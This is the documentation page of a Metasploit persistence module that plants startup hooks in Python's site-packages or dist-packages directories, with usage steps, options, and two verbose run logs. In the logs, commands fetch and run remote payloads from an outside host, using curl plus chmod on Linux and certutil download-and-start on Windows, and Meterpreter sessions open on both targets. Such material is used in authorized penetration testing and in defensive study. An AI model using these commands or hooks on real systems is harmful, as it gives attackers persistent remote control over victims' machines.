## Vulnerable Application

This module leverages Python's startup mechanism, where some files can be automically processed during the initialization of the Python interpreter. One of those files are startup hooks (site-specific, dist-packages). If these files are present in `site-specific` or `dist-packages` directories, any lines beginning with `import` will be executed automatically. This creates a persistence mechanism, if an attacker has established access to target machine with sufficient permissions.

## Verification Steps

1. Start msfconsole
1. Get a session 
1. Do: `use multi/persistence/python_site_specific_hook`
1. Do: `set session #`
1. Do: `run`

## Options

### PYTHON_HOOK_PATH

If user has session to target machine with non-typical Python paths, they can set their own path to Python hooks.

### EXECUTION_TARGET

Python has multiple locations, where it can store startup hooks. This option specifies if the target location should be SYSTEM one - i.e. should affect all users - or USER one, which targets current user.

## Scenarios

### Linux pop-os 6.17.4-76061704-generic

```
msf exploit(multi/persistence/python_site_specific_hook) > run verbose=true 
[*] Command to run on remote host: curl -so ./xtLDGMnHcvHv http://192.168.3.7:8080/EO6WzfXF6CGyqdBiy1rT5w;chmod +x ./xtLDGMnHcvHv;./xtLDGMnHcvHv&
[*] Exploit running as background job 9.
[*] Exploit completed, but no session was created.

[*] Fetch handler listening on 192.168.3.7:8080
[*] HTTP server started
[*] Adding resource /EO6WzfXF6CGyqdBiy1rT5w
msf exploit(multi/persistence/python_site_specific_hook) > [*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Python is present on the system
[*] Detected Python version 3.10
[*] Got path to site-specific hooks /usr/local/lib/python3.10/dist-packages/
[*] Creating directory /usr/local/lib/python3.10/dist-packages/
[*] /usr/local/lib/python3.10/dist-packages/ created
[*] Client 192.168.3.7 requested /EO6WzfXF6CGyqdBiy1rT5w
[*] Sending payload to 192.168.3.7 (curl/7.81.0)
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3090404 bytes) to 192.168.3.7
[*] Meterpreter session 4 opened (192.168.3.7:4444 -> 192.168.3.7:34170) at 2025-11-19 07:04:54 +0100

msf exploit(multi/persistence/python_site_specific_hook) > sessions 4
[*] Starting interaction with 4...

meterpreter > sysinfo
Computer     : 172.16.187.129
OS           : Pop 22.04 (Linux 6.17.4-76061704-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: ms

```

### Windows 10.0.15063
```
msf exploit(multi/persistence/python_site_specific_hook) > run verbose=true 
[*] Command to run on remote host: certutil -urlcache -f http://192.168.3.7:8080/P0P_l8MTdDPpi4BXoUKxZw %TEMP%\RAKYJqUXyJK.exe & start /B %TEMP%\RAKYJqUXyJK.exe
[*] Exploit running as background job 7.
[*] Exploit completed, but no session was created.
msf exploit(multi/persistence/python_site_specific_hook) > 
[*] Fetch handler listening on 192.168.3.7:8080
[*] HTTP server started
[*] Adding resource /P0P_l8MTdDPpi4BXoUKxZw
[*] Started reverse TCP handler on 192.168.3.7:9999 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable. Python is present on the system
[*] Detected Python version 3.13
[*] Got path to site-specific hooks C:\Users\msfuser/AppData/Local/Programs/Python/Python313/Lib/site-packages/
[*] Client 10.5.132.155 requested /P0P_l8MTdDPpi4BXoUKxZw
[*] Sending payload to 10.5.132.155 (Microsoft-CryptoAPI/10.0)
[*] Client 10.5.132.155 requested /P0P_l8MTdDPpi4BXoUKxZw
[*] Sending payload to 10.5.132.155 (CertUtil URL Agent)
[*] Sending stage (230982 bytes) to 10.5.132.155
[*] Meterpreter session 3 opened (192.168.3.7:9999 -> 10.5.132.155:51726) at 2025-11-19 07:52:00 +0100

msf exploit(multi/persistence/python_site_specific_hook) > sessions  3
[*] Starting interaction with 3...

meterpreter > sysinfo
Computer        : WIN10_1703_1018
OS              : Windows 10 1703 (10.0 Build 15063).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: WIN10_1703_1018\msfuser

```
